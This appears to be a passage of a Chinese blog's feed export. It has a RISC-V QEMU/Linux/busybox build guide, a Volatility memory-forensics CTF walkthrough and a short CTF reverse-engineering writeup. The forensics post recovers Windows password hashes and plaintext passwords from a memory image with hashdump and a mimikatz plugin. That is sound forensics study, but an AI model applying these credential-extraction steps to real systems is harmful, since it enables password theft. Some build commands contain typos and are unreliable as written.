<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/qemu/qemu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>编译</p>
<pre class="line-numbers language-none"><code class="language-none">cd qemu
git checkout v5.0.0
./configure --target-list=riscv64-softmmu
make -j $(nproc)
sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="编译linux-kernel"><a href="#编译linux-kernel" class="headerlink" title="编译linux kernel"></a>编译linux kernel</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/torvalds/linux.git
<span class="token builtin class-name">cd</span> linux
<span class="token function">git</span> checkout v5.11
<span class="token function">make</span> <span class="token assign-left variable">ARCH</span><span class="token operator">=</span>riscv <span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- defconfig
<span class="token function">make</span> <span class="token assign-left variable">ARCH</span><span class="token operator">=</span>riscv <span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- -j <span class="token variable"><span class="token variable">$(</span>nproc<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>编译完成后，最后生成的Kernel文件在linux/arch/riscv/boot/Image</p>
<h1 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://git.busybox.net/busybox
<span class="token builtin class-name">cd</span> busybox
<span class="token comment"># 选择Build static binary</span>
<span class="token comment"># 编译选项中需要添加  --sysroot=$RISCV/sysroot</span>
<span class="token comment"># 否则会出现缺失头文件的错误</span>
<span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- <span class="token function">make</span> menuconfig
<span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- <span class="token function">make</span> -j <span class="token variable"><span class="token variable">$(</span>nproc<span class="token variable">)</span></span>
<span class="token assign-left variable">CROSS_COMPILE</span><span class="token operator">=</span>riscv64-unknown-linux-gnu- <span class="token function">make</span> <span class="token function">install</span>
<span class="token builtin class-name">cd</span> _install
<span class="token function">mkdir</span> -pv <span class="token punctuation">{</span>bin,sbin,etc,proc,sys,usr/<span class="token punctuation">{</span>bin,sbin<span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="制作根文件系统"><a href="#制作根文件系统" class="headerlink" title="制作根文件系统"></a>制作根文件系统</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> rootfs
qemu-img create rootfs.img
<span class="token function">sudo</span> <span class="token function">mount</span> -o loop rootfs.img rootfs
sudno <span class="token function">cp</span> -r busybox/_install ./rootfs/
<span class="token function">sudo</span> <span class="token function">umount</span> rootfs <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="启动基本linux程序"><a href="#启动基本linux程序" class="headerlink" title="启动基本linux程序"></a>启动基本linux程序</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-riscv64 -M virt -m 256M -nographic -kernel ./linux/arch/riscv/boot/Image -drive <span class="token assign-left variable">file</span><span class="token operator">=</span>rootfs.img,format<span class="token operator">=</span>raw,id<span class="token operator">=</span>hd0 -device virtio-blk-device,drive<span class="token operator">=</span>hd0 -append <span class="token string">"root=/dev/vda rw console=ttyS0"</span> -bios default<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="运行ubuntu"><a href="#运行ubuntu" class="headerlink" title="运行ubuntu"></a>运行ubuntu</h1><p>工具准备</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-system-misc opensbi u-boot-qemu qemu-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载镜像</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://old-releases.ubuntu.com/releases/focal/ubuntu-20.04.2-preinstalled-server-riscv64.img.xz

xz -dk ubuntu-20.04.2-preinstalled-server-riscv64.img.xz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>启动qemu-ubuntu</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-system-riscv64 -machine virt -nographic -m <span class="token number">2048</span> -smp <span class="token number">4</span> -bios /usr/lib/riscv64-linux-gnu/opensbi/generic/fw_jump.elf -kernel /usr/lib/u-boot/qemu-riscv64_smode/uboot.elf -device virtio-net-device,netdev<span class="token operator">=</span>eth0 -netdev user,id<span class="token operator">=</span>eth0 -drive <span class="token assign-left variable">file</span><span class="token operator">=</span>ubuntu-20.04.2-preinstalled-server-riscv64.img,format<span class="token operator">=</span>raw,if<span class="token operator">=</span>virtio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用户名/密码：ubuntu/ubuntu</p>
<p>qemu命令选项解释：<br>-bios：设置bios程序<br>-kernel：设置操作系统内核<br>-drive file=<filename>：指定根文件系统<br>netdev=eth0：表示使用本机的eth0网卡    </filename></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://cloud.tencent.com/developer/article/1825739">https://cloud.tencent.com/developer/article/1825739</a></li>
<li><a href="https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html">https://risc-v-getting-started-guide.readthedocs.io/en/latest/linux-qemu.html</a></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Volatility内存取证初探——获取windows密码</title>
    <url>/2021/09/16/volatility-nei-cun-qu-zheng-chu-tan-huo-qu-windows-mi-ma/</url>
    <content><![CDATA[<h1 id="安装volatility"><a href="#安装volatility" class="headerlink" title="安装volatility"></a>安装volatility</h1><p>apt 安装</p>
<pre class="line-numbers language-none"><code class="language-none">apt-get install volatility<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>python源码编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/volatilityfoundation/volatility.git
python setup.py build
python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>实验目标为陇剑杯内存分析所提供附件</p>
<h2 id="分析系统信息"><a href="#分析系统信息" class="headerlink" title="分析系统信息"></a>分析系统信息</h2><pre class="line-numbers language-none"><code class="language-none">vol.py -f ./Target.vmem imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="/2021/09/16/volatility-nei-cun-qu-zheng-chu-tan-huo-qu-windows-mi-ma/%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF.png" class="">

<h2 id="查看进程列表"><a href="#查看进程列表" class="headerlink" title="查看进程列表"></a>查看进程列表</h2><pre class="line-numbers language-none"><code class="language-none">vol.py -f ./Target.vmem --profile=Win7SP1x64 pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="查看内存缓存中的注册表信息"><a href="#查看内存缓存中的注册表信息" class="headerlink" title="查看内存缓存中的注册表信息"></a>查看内存缓存中的注册表信息</h2><pre class="line-numbers language-none"><code class="language-none">vol.py -f ./Target.vmem --profile=Win7SP1x64 hivelist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="/2021/09/16/volatility-nei-cun-qu-zheng-chu-tan-huo-qu-windows-mi-ma/%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%A1%E6%81%AF.png" class="">

<h2 id="查看注册表中列出的文件内容"><a href="#查看注册表中列出的文件内容" class="headerlink" title="查看注册表中列出的文件内容"></a>查看注册表中列出的文件内容</h2><pre class="line-numbers language-none"><code class="language-none"># offset为注册表对应的虚拟地址
vol.py -f ./Target.vmem --profile=Win7SP1x64 hivedump -o &lt;offset&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="查看注册表的某项键值"><a href="#查看注册表的某项键值" class="headerlink" title="查看注册表的某项键值"></a>查看注册表的某项键值</h2><pre class="line-numbers language-none"><code class="language-none">vol.py -f ./Target.vmem --profile=Win7SP1x64 printkey -K &lt;filename&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="查看用户密码hash值"><a href="#查看用户密码hash值" class="headerlink" title="查看用户密码hash值"></a>查看用户密码hash值</h2><pre class="line-numbers language-none"><code class="language-none">vol.py -f ./Target.vmem --profile=Win7SP1x64 hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="/2021/09/16/volatility-nei-cun-qu-zheng-chu-tan-huo-qu-windows-mi-ma/hash.png" class="">

<p>这一步hash爆破失败</p>
<h2 id="volatility-mimikatz获取用户明文密码"><a href="#volatility-mimikatz获取用户明文密码" class="headerlink" title="volatility+mimikatz获取用户明文密码"></a>volatility+mimikatz获取用户明文密码</h2><p>环境准备：</p>
<pre class="line-numbers language-none"><code class="language-none"># 注意是python2
sudo pip install construct==2.5.5-reupload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>把mimikatz.py(github上找一下)放进volatility文件夹的plugins文件夹内</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py -f ./Target.vmem --profile=Win7SP1x64 mimikatz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="/2021/09/16/volatility-nei-cun-qu-zheng-chu-tan-huo-qu-windows-mi-ma/%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81.png" class="">

<h2 id="查看和dump文件"><a href="#查看和dump文件" class="headerlink" title="查看和dump文件"></a>查看和dump文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看文件</span>
vol.py -f ./Target.vmem --profile<span class="token operator">=</span>Win7SP1x64 filescan
<span class="token comment"># dump文件</span>
vol.py -f ./Target.vmem --profile<span class="token operator">=</span>Win7SP1x64 dumpfiles -D <span class="token builtin class-name">.</span> -Q phyoffset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="解密HUAWEI备份文件"><a href="#解密HUAWEI备份文件" class="headerlink" title="解密HUAWEI备份文件"></a>解密HUAWEI备份文件</h2><p>dump出备份文件，发现它是windows下的.zip压缩包</p>
<pre class="line-numbers language-none"><code class="language-none">vol.py -f ./Target.vmem --profile=Win7SP1x64 dumpfiles -D ./backup/ -Q 0x000000007d8c7d10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>解压<br>kobackupdec梭哈</p>
<pre class="line-numbers language-none"><code class="language-none">python3 kobackupdec/kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX "D:\HUAWEI P40_2021-aa-bb xx.yy.zz" D:\backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://gryffinbit.top/2020/12/05/kali%E4%B8%8Bvolatility%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/">https://gryffinbit.top/2020/12/05/kali%E4%B8%8Bvolatility%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</a></li>
</ol>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
  </entry>
  <entry>
    <title>Android反破解技术</title>
    <url>/2021/09/16/android-fan-po-jie-ji-zhu/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
  </entry>
  <entry>
    <title>长城杯Writeup</title>
    <url>/2021/09/19/chang-cheng-bei-writeup/</url>
    <content><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Just-cmp-Re"><a href="#Just-cmp-Re" class="headerlink" title="Just_cmp_Re"></a>Just_cmp_Re</h2><p>main函数</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 __fastcall main(int a1, char **a2, char **a3)
{
  __int64 result; // rax

  if ( a3 &gt; 1 )
  {
    if ( !strcmp(a1[1], "flag{********************************}") )
      puts("Correct!");
    else
      puts("Wrong!");
  }
  else
  {
    printf("Usage: %s &lt;FLAG&gt;\n", *a1);
  }
  return 0LL;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>没什么好说的，strcmp函数，比对字符串，设置参数为flag{********************************}，直接运行，输出Correct，即在运行过程中代码不会被改变</p>
<p>脑洞了，静态看一下init，没什么线索。发现函数0x800中引入了0x1060处的数组，并做了减法。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># IDA脚本</span>
addr <span class="token operator">=</span> <span class="token number">0x1060</span>
plain_text <span class="token operator">=</span> <span class="token string">"flag{********************************}"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span class="token operator">+</span>Byte<span class="token punctuation">(</span>addr<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Funny-js"><a href="#Funny-js" class="headerlink" title="Funny_js"></a>Funny_js</h2><p>直接参考<a href="https://l0x1c.github.io/2020/04/30/2020-4-30/#%E7%9C%8B%E9%9B%AACTF%E2%80%94%E2%80%94%E5%AF%BB%E8%B8%AA%E8%A7%85%E6%BA%90">https://l0x1c.github.io/2020/04/30/2020-4-30/#看雪CTF——寻踪觅源</a><br>加密算法是RC4(flag, key) ^ 0x23 == fix_arr<br>fix_arr = [150,224,244,68,61,125,8,239,203,254,241,113,213,176,64,106,103,166,185,159,158,172,9,213,239,12,100,185,90,174,107,131,223,122,229,157]</p>
<p>key = "2021quickjs_happygame"</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
</search>
